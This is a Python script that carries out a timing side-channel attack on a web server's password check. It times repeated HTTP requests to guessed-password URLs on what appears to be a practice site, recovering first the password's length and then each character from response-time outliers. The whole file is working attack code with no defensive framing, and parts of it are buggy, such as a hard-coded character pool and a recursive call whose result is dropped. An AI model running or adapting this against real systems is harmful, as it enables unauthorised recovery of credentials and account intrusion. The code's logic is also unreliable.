import time
from statistics import stdev

import requests



def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


def find_tav(temp_pass):
    """
    the function is going over all the valid chars for the password and filters the chars that gave sagnificant change in the response time
    the function runs while the POOL len is bigger than one which means there is still more than one option and it returns the process of filtering
    Args:
        temp_pass (string): the part of the pass we have already found

    Returns:
        POOL (char): the tav for the pass which made a change in the time pf the response gone trough the filter process
    """
    POOL = 'f43adgnertm'
    time_values = []# the list of al the characters' times' values
    
    #going over the valid char for pass
    for tav in POOL:
        # add the char to the part of the pass we have already found
        pass_checked = temp_pass + tav  
        #add the pass we want to excute fill the rest with *
        executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
        time_values.append(min(timeit(executed_url, 10)))
        print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
    
    # calculate the statistics for finding the correct lowest time
    average = sum(time_values) / len(time_values)
    print(f' the average is:{average}')
    standart_deviation = stdev(time_values)
    print(f'the std is : {standart_deviation}')
    
    pool_start_length = len(POOL)
    
    #going over all the times we have gathered
    for time in time_values:
        #if the time is an exception which means he gave a sagnificant change in the time of response add it to the end of pool 
        # we have the start len so afterwards we can cut it and stay with the wanted values
        if abs(time - average) > 0.8 * standart_deviation:
            print(f'the password {temp_pass + POOL[time_values.index(time)]} substraction from std is: {abs(time - average)}')
            POOL += POOL[time_values.index(time)]
    
    # if the len of the pool is bigger than the len at the start it means that we found options for the char and we leave in the pool the values added
    if len(POOL) > pool_start_length:
        POOL = POOL[pool_start_length:]
    
    #when the len id bigger than 1 there is more than one option
    while len(POOL) > 1:
        #saving the len of the current pool so in need we can remove this cut the pool and leave the values that gave exception
        pool_start_length = len(POOL)
        
        #going over the pool again
        for tav in POOL:
            # add the char to the part of the pass we have already found
            pass_checked = temp_pass + tav
            executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
            current_time = min(timeit(executed_url, 10))
            print(f'checking password: {pass_checked} time was measured: {current_time}')
            
            # if the time is an exception which means he gave a sagnificant change in the time of response add it to the end of pool 
            # we have the len of the pool we are going over so afterwards we can cut it and stay with the wanted values
            if abs(current_time - average) > 0.8 * standart_deviation:
                POOL += tav
                print(f'the tav {tav} is an exception {abs(current_time-average)}')
        
        #if there was a change in the len of the pool during the run which means we have filtered more char
        if len(POOL) > pool_start_length:
            POOL = POOL[pool_start_length:]
    
    #the loop ended and there is only one char in POOL
    return POOL


def find_pass_len(url, MAX_LEN):
    """this function runs through all the possible lengths by order, until it find one which is an 
    exception and return the previous length

    Args:
        url (string): the server's url
        MAX_LEN (integer): the maximum possible length of the password

    Returns:
        (int): the password's length
    """
    time_values = []# list of the times which took every length to response
    possible_lens = [i for i in range(1 ,MAX_LEN + 1 , 1)]# list with all the possible lengths
    
    for length in possible_lens:# runs through all the lengths and measure time
        executed_url = url + "/" + "".ljust(length, '*')# creating the url used for the specefic length
        time_values.append(min(timeit(executed_url,10)))# pushing the most accurate measurment of the specefic length
        
        print(f'checking password: {length} time was measured: {time_values[-1]}')
        
        if length > 1:# standart deviation can only be calculate with more than 2 numbers
            # calculating the data for finding the length
            standart_deviation = stdev(time_values)
            average = sum(time_values) / len(time_values)
            print(f'the average is: {average}; the standart deviation is:{standart_deviation}; the substruction from the the length\'s stime to the avergae is: {time_values[-1]-average}')
            # if the current length is significantly bigger the the average return the previuos length which was meaasured
            if time_values[-1] - average > standart_deviation:
                return len(time_values)-1 
    
    #---------------------------------------------------------------------------------
    # in case nothing was found while the first run   
    # runs through them all with the standart deviation         
    average = sum(time_values) / len(time_values)
    print(f' the average is:{average}')
    standart_devitation = stdev(time_values)
    print(f'the std is : {standart_devitation}')

    for time in time_values:
        # if the current length is significantly bigger the the average return the previuos length which was meaasured
        if time - average > standart_devitation:
            print(f'the length: {time_values.index(time) + 1} time: {time} std: {abs(time - average)}')
            return possible_lens[time_values.index(time)] - 1
    
    # if nothing was found, call the function again, there might be some internet struggles
    find_pass_len(url, 10)


if __name__ == '__main__':
    GAL_SITE = False

    if GAL_SITE:
        url = "https://agamhacks.herokuapp.com"
        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    else:
        url = "https://agamhacks.herokuapp.com"# https://passwordserver.herokuapp.com

        POOL = 'A1IHiy24U3uV'

    pswd_len = 4

    POOL  = 'A1IHiy24U3uV'# the short pool we are using
    pass_length = find_pass_len(url, 10)
    final_pass = ""
    for num in range(pass_length):
        final_pass += find_tav(final_pass)
    print(final_pass)